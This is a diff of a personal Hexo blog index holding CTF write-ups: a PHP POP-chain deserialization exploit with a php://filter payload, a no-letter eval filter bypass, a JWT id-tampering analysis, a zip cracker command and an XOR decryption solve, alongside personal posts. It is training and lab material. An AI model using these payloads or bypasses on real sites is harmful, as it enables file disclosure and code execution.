-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span>  = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);                   <span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);                       <span class="comment">#1 这里是pop链最后一步 要include f14g.php,了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pipi = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$corepop</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();                              <span class="comment">#3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PopukoPipimi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$is</span> = <span class="string">&quot;Good sisters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>,<span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to HNCTF2022 ,&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This is &#x27;</span>.<span class="variable language_">$this</span>-&gt;kiminonawa.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;                   <span class="comment">#4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;             <span class="comment">#5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>] == <span class="string">&quot;ep683045&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;欸嘿,你也喜欢pop子~对吧ww&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>exp1:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span> = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);                   <span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);                       <span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="comment">#$this-&gt;pipi = array();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p=<span class="keyword">new</span> <span class="title class_">Popuko</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>, <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Pipimi</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;                   <span class="comment">#4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;             <span class="comment">#5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kiminonawa = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+    <title>自动化漏洞通报</title>
+    <url>/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/</url>
+    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>漏洞通告</p>
+<p>自动化吧，建议ai+爬虫自动生产就行</p>
+<p>监控下公众号或者威胁情况官网的更新，然后自动调大模型生产就行了</p>
+<p><a href="https://avd.aliyun.com/high-risk/list">https://avd.aliyun.com/high-risk/list</a> 数据源可以用这个，大模型自己选吧，无所谓，用免费的就行</p>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>表格</p>
+<p>时间戳</p>
+<p>滑块验证</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>test for next</title>
+    <url>/2025/02/25/test-for-next/</url>
+    <content><![CDATA[<p>561695156</p>
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>why no categories</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
-        <tag>POP链</tag>
+        <tag>why no tag</tag>
       </tags>
   </entry>
   <entry>
-    <title>[SWPUCTF 2021 新生赛]hardrce</title>
-    <url>/2025/02/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/</url>
-    <content><![CDATA[<p>此题属于我之前写了一半看了wp望而却步的一部分</p>
-<p>贴个源代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <title>ZipCracker命令及使用场景</title>
+    <url>/2025/02/25/ZipCracker%E5%91%BD%E4%BB%A4%E5%8F%8A%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ZipCracker.py &lt;同目录下压缩包名字&gt; &lt;自定义字典&gt; (可选)</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>可以看出，要绕过⿊名单和正则表达式。 不能异或，不能有字⺟数字。</p>
-</blockquote>
-<p>因为if(preg_match(‘&#x2F;[a-zA-Z]&#x2F;is’,$wllm))把所有字母都禁了，所以只能取反绕过</p>
-<p>取反绕过的原理：</p>
-<blockquote>
-<p>我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。</p>
-<p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p>
-</blockquote>
-<p>发现一篇很有价值的文章：<a href="https://cloud.tencent.com/developer/article/1838778">Web安全 | 无字母数字Webshell 总结</a></p>
+<p>python3没反应试试python</p>
+<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>有个压缩包，没提示，想硬解</p>
+<p>好慢，要两个小时，属于小学题目里的先烧开水了</p>
 ]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
       <tags>
-        <tag>无字母RCE</tag>
-        <tag>RCE</tag>
-        <tag>WAF绕过</tag>
+        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
-    <title>[SWPU 2020]找找吧</title>
-    <url>/2025/02/23/SWPU-2020-%E6%89%BE%E6%89%BE%E5%90%A7/</url>
+    <title>小米平板6与联想小新触控笔灵动版的结合</title>
+    <url>/2025/02/25/%E5%B0%8F%E7%B1%B3%E5%B9%B3%E6%9D%BF6%E4%B8%8E%E8%81%94%E6%83%B3%E5%B0%8F%E6%96%B0%E8%A7%A6%E6%8E%A7%E7%AC%94%E7%81%B5%E5%8A%A8%E7%89%88%E7%9A%84%E7%BB%93%E5%90%88/</url>
+    <content><![CDATA[<p>bl锁找闲鱼解的，模块自己刷的，就是回学校莫名其妙失灵了。</p>
+<p>在网上找到底是怎么回事，一无所获。在小红书刷到要壳脱下来，立马好了</p>
+<p>神医啊…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>[SWPUCTF 2021 新生赛]fakerandom </title>
+    <url>/2025/02/25/%C2%96SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-fakerandom/</url>
+    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    l.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line">result=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        result.append(<span class="built_in">ord</span>(flag[i*<span class="number">5</span>+n])^random.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密结果</span></span><br><span class="line">result = [<span class="number">201</span>, <span class="number">8</span>, <span class="number">198</span>, <span class="number">68</span>, <span class="number">131</span>, <span class="number">152</span>, <span class="number">186</span>, <span class="number">136</span>, <span class="number">13</span>, <span class="number">130</span>, <span class="number">190</span>, <span class="number">112</span>, <span class="number">251</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">214</span>, <span class="number">116</span>, <span class="number">244</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：重新生成随机数种子列表 l</span></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    l.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：解密 flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># 异或运算解密</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(result[index] ^ random.getrandbits(<span class="number">8</span>))</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的 flag 为:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>接口到底是什么</title>
+    <url>/2025/02/25/%E6%8E%A5%E5%8F%A3%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>摔跤了</title>
+    <url>/2025/02/25/%E6%91%94%E8%B7%A4%E4%BA%86/</url>
+    <content><![CDATA[<p>当我骑着那辆又小又破的自行车转弯的时候，我犯了一个错——我把它扭成了锐角。事情开始变得不对劲了，车辆开始向左侧倒去，我一手拧着 车把一手撑着伞试图挣扎，事与愿违。其惨状我不想多加描述，总之损失如下：钢化膜碎了，伞弯了——事后我在试图敲直它的时候从中间裂开，膝盖和手掌擦伤了。</p>
+<p>至于我为什么顶着小雨出来，那就是另一番故事了。                                                    </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>我的Waline怎么评论框都没有啊啊啊啊啊啊啊啊啊啊啊啊啊啊</title>
+    <url>/2025/02/24/%E6%88%91%E7%9A%84Waline%E6%80%8E%E4%B9%88%E8%AF%84%E8%AE%BA%E6%A1%86%E9%83%BD%E6%B2%A1%E6%9C%89%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A/</url>
+    <content><![CDATA[<p>我都是按照教程做的啊我请问呢别管了歇会NSS看着NPC的题解</p>
+<p>这样吧，你们都去</p>
+<p><a href="https://comment-ptzxs5z4j-gentle-knifes-projects.vercel.app/">https://comment-ptzxs5z4j-gentle-knifes-projects.vercel.app/</a></p>
+<p>评论</p>
+]]></content>
   </entry>
   <entry>
     <title>What&#39;s Wrong With My Valine</title>
@@ -413,6 +276,11 @@
 <p>真不知道出啥问题了</p>
 <p>还有加密系统，理论上一个npm一个tags:password&#x3D;1 就能解决的事情，结果输入密码了也看不了文章…</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>[SWPU 2020]找找吧</title>
+    <url>/2025/02/23/SWPU-2020-%E6%89%BE%E6%89%BE%E5%90%A7/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>[SWPUCTF 2021 新生赛]pop</title>
@@ -690,106 +558,57 @@
       </tags>
   </entry>
   <entry>
-    <title>ZipCracker命令及使用场景</title>
-    <url>/2025/02/25/ZipCracker%E5%91%BD%E4%BB%A4%E5%8F%8A%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ZipCracker.py &lt;同目录下压缩包名字&gt; &lt;自定义字典&gt; (可选)</span><br></pre></td></tr></table></figure>
+    <title>PHP反序列化学习笔记汇总</title>
+    <url>/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()</span><br></pre></td></tr></table></figure>
 
-<p>python3没反应试试python</p>
-<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>有个压缩包，没提示，想硬解</p>
-<p>好慢，要两个小时，属于小学题目里的先烧开水了</p>
+<p>触发时机：</p>
+<p>1、实例化对象结束后触发  如$test&#x3D;new User();</p>
+<p>2、在反序列化之后立马会触发（序列化不会触发）</p>
+<p>就是</p>
+<p>$a &#x3D;<strong>new</strong> b</p>
+<p><strong>unserialize()</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__toString()</span><br></pre></td></tr></table></figure>
+
+<p>把对象当成字符串使用</p>
+<p>就是</p>
+<p><strong>echo</strong></p>
 ]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[ZJCTF 2019]NiZhuanSiWei</title>
-    <url>/2025/02/13/ZJCTF-2019-NiZhuanSiWei/</url>
-    <content><![CDATA[]]></content>
       <categories>
         <category>Web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>反序列化</tag>
-        <tag>PHP伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>misc的各种编码</title>
-    <url>/2025/02/11/misc%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="emoji编码"><a href="#emoji编码" class="headerlink" title="emoji编码"></a>emoji编码</h2><p>在线网站解密<a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
-<p>key一般在文件名中或其他地方</p>
-<p>e.g.[SWPUCTF 2023 秋季新生赛]谁发的图片打不开啊</p>
-<h1 id="佛"><a href="#佛" class="headerlink" title="佛"></a>佛</h1><h1 id="BK编码"><a href="#BK编码" class="headerlink" title="BK编码"></a>BK编码</h1><h1 id="JSFuck编码"><a href="#JSFuck编码" class="headerlink" title="JSFuck编码"></a>JSFuck编码</h1><p>&#x2F;&#x2F;特征：与jother很像，只是少了{ }</p>
-<p>特征：[] + ! ()</p>
-]]></content>
-      <categories>
-        <category>Misc</category>
       </categories>
       <tags>
         <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2025/02/11/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<p><img src="C:\Users\111\Desktop\myBlog\source_posts\my-first-blog\头像.jpg" alt="头像"></p>
+    <title>[陇剑杯 2021]日志分析（问1）+jwt（问2）</title>
+    <url>/2025/02/22/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="日志分析（问1）"><a href="#日志分析（问1）" class="headerlink" title="日志分析（问1）"></a>日志分析（问1）</h1><p>把日志用010打开，搜索200<br><img src="https://www.nssctf.cn/files/2023/9/25/3eecd8b87f.jpg" alt="NSSIMAGE"><br>看到一个下载www%2ezip的，%2e在十六进制表示.，所以源文件是<a href="http://www.zip/">www.zip</a></p>
+<h1 id="jwt（问2）"><a href="#jwt（问2）" class="headerlink" title="jwt（问2）"></a>jwt（问2）</h1><p>题目说攻击者是进行了绕过的，流量里登录了两遍，登陆之后执行whoami都是失败的，返回权限不足，下面第三遍执行whoami时突然成功了，结合查到<img src="/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140947.png" alt="QQ20250222-140947">的jwt绕过方法，攻击者是修改tocken值进行<img src="/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140911.png" alt="QQ20250222-140911">绕过的，将原本10086的id改为了10087，获取到了管理员权限</p>
 ]]></content>
       <categories>
-        <category>Index</category>
+        <category>Misc</category>
       </categories>
       <tags>
-        <tag>First</tag>
+        <tag>流量分析</tag>
+        <tag>Webshell流量</tag>
+        <tag>日志审计</tag>
       </tags>
   </entry>
   <entry>
-    <title>my first blog</title>
-    <url>/2025/02/11/my-first-blog/</url>
-    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试： </p>
